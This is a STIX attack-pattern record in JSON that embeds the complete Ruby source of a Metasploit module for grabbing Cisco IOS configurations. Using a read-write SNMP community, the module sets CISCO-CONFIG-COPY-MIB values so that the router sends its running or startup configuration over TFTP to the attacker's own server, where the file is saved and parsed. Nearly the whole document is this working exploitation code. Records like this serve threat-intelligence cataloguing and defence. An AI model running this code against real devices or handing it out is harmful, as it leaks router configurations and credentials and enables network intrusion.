{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--d1853d64-3e33-412c-8a21-5e64cd96c875",
    "created": "2024-08-14T16:27:42.234974Z",
    "modified": "2024-08-14T16:27:42.234978Z",
    "name": "Cisco IOS SNMP Configuration Grabber (TFTP)",
    "description": " This module will download the startup or running configuration from a Cisco IOS device using SNMP and TFTP. A read-write SNMP community is required. The SNMP community scanner module can assist in identifying a read-write community. The target must be able to connect back to the Metasploit system and the use of NAT will cause the TFTP transfer to fail. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/scanner/snmp/cisco_config_tftp.rb",
            "external_id": "cisco_config_tftp.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::SNMPClient\n  include Msf::Auxiliary::Cisco\n  include Msf::Auxiliary::Scanner\n\n  def initialize\n    super(\n      'Name'        => 'Cisco IOS SNMP Configuration Grabber (TFTP)',\n      'Description' => %q{\n          This module will download the startup or running configuration\n        from a Cisco IOS device using SNMP and TFTP. A read-write SNMP\n        community is required. The SNMP community scanner module can\n        assist in identifying a read-write community. The target must\n        be able to connect back to the Metasploit system and the use of\n        NAT will cause the TFTP transfer to fail.\n      },\n      'Author'      =>\n        [\n          'pello <fropert[at]packetfault.org>', 'hdm'\n        ],\n      'License'     => MSF_LICENSE\n    )\n    register_options([\n      OptEnum.new(\"SOURCE\", [true, \"Grab the startup (3) or running (4) configuration\", \"4\", [\"3\",\"4\"]]),\n      OptString.new('OUTPUTDIR', [ false, \"The directory where we should save the configuration files (disabled by default)\"]),\n      OptAddressLocal.new('LHOST', [ false, \"The IP address of the system running this module\" ])\n    ])\n  end\n\n\n  #\n  # Start the TFTP Server\n  #\n  def setup\n    # Setup is called only once\n    print_status(\"Starting TFTP server...\")\n    @tftp = Rex::Proto::TFTP::Server.new(69, '0.0.0.0', { 'Msf' => framework, 'MsfExploit' => self })\n    @tftp.incoming_file_hook = Proc.new{|info| process_incoming(info) }\n    @tftp.start\n    add_socket(@tftp.sock)\n\n    @main_thread = ::Thread.current\n\n    print_status(\"Scanning for vulnerable targets...\")\n  end\n\n  #\n  # Kill the TFTP server\n  #\n  def cleanup\n    # Cleanup is called once for every single thread\n    if ::Thread.current == @main_thread\n      # Wait 5 seconds for background transfers to complete\n      print_status(\"Providing some time for transfers to complete...\")\n      ::IO.select(nil, nil, nil, 5.0)\n\n      print_status(\"Shutting down the TFTP service...\")\n      if @tftp\n        @tftp.close rescue nil\n        @tftp = nil\n      end\n    end\n  end\n\n  #\n  # Callback for incoming files\n  #\n  def process_incoming(info)\n    return if not info[:file]\n    name = info[:file][:name]\n    data = info[:file][:data]\n    from = info[:from]\n    return if not (name and data)\n\n    # Trim off IPv6 mapped IPv4 if necessary\n    from = from[0].dup\n    from.gsub!('::ffff:', '')\n\n    print_status(\"Incoming file from #{from} - #{name} #{data.length} bytes\")\n\n    # Save the configuration file if a path is specified\n    if datastore['OUTPUTDIR']\n      name = \"#{from}.txt\"\n      ::FileUtils.mkdir_p(datastore['OUTPUTDIR'])\n      path = ::File.join(datastore['OUTPUTDIR'], name)\n      ::File.open(path, \"wb\") do |fd|\n        fd.write(data)\n      end\n      print_status(\"Saved configuration file to #{path}\")\n    end\n\n    # Toss the configuration file to the parser\n    cisco_ios_config_eater(from, 161, data)\n  end\n\n  def run_host(ip)\n\n    begin\n      source   = datastore['SOURCE'].to_i\n      protocol = 1\n      filename = \"#{ip}.txt\"\n      lhost    = datastore['LHOST'] || Rex::Socket.source_address(ip)\n\n      ccconfigcopyprotocol = \"1.3.6.1.4.1.9.9.96.1.1.1.1.2.\"\n      cccopysourcefiletype = \"1.3.6.1.4.1.9.9.96.1.1.1.1.3.\"\n      cccopydestfiletype   = \"1.3.6.1.4.1.9.9.96.1.1.1.1.4.\"\n      cccopyserveraddress  = \"1.3.6.1.4.1.9.9.96.1.1.1.1.5.\"\n      cccopyfilename       = \"1.3.6.1.4.1.9.9.96.1.1.1.1.6.\"\n      cccopyentryrowstatus = \"1.3.6.1.4.1.9.9.96.1.1.1.1.14.\"\n\n      session = rand(255) + 1\n\n      snmp = connect_snmp\n\n\n      varbind = SNMP::VarBind.new(\"#{ccconfigcopyprotocol}#{session}\" , SNMP::Integer.new(protocol))\n      value = snmp.set(varbind)\n\n      # If the above line didn't throw an error, the host is alive and the community is valid\n      print_status(\"Trying to acquire configuration from #{ip}...\")\n\n      varbind = SNMP::VarBind.new(\"#{cccopysourcefiletype}#{session}\" , SNMP::Integer.new(source))\n      value = snmp.set(varbind)\n\n      varbind = SNMP::VarBind.new(\"#{cccopydestfiletype}#{session}\", SNMP::Integer.new(1))\n      value = snmp.set(varbind)\n\n      varbind = SNMP::VarBind.new(\"#{cccopyserveraddress}#{session}\", SNMP::IpAddress.new(lhost))\n      value = snmp.set(varbind)\n\n      varbind = SNMP::VarBind.new(\"#{cccopyfilename}#{session}\", SNMP::OctetString.new(filename))\n      value = snmp.set(varbind)\n\n      varbind = SNMP::VarBind.new(\"#{cccopyentryrowstatus}#{session}\", SNMP::Integer.new(1))\n      value = snmp.set(varbind)\n\n      varbind = SNMP::VarBind.new(\"#{cccopyentryrowstatus}#{session}\", SNMP::Integer.new(6))\n      value = snmp.set(varbind)\n\n    # No need to make noise about timeouts\n    rescue ::Rex::ConnectionError, ::SNMP::RequestTimeout, ::SNMP::UnsupportedVersion\n    rescue ::Interrupt\n      raise $!\n    rescue ::Exception => e\n      print_error(\"#{ip} Error: #{e.class} #{e} #{e.backtrace}\")\n    ensure\n      disconnect_snmp\n    end\n  end\nend\n"
}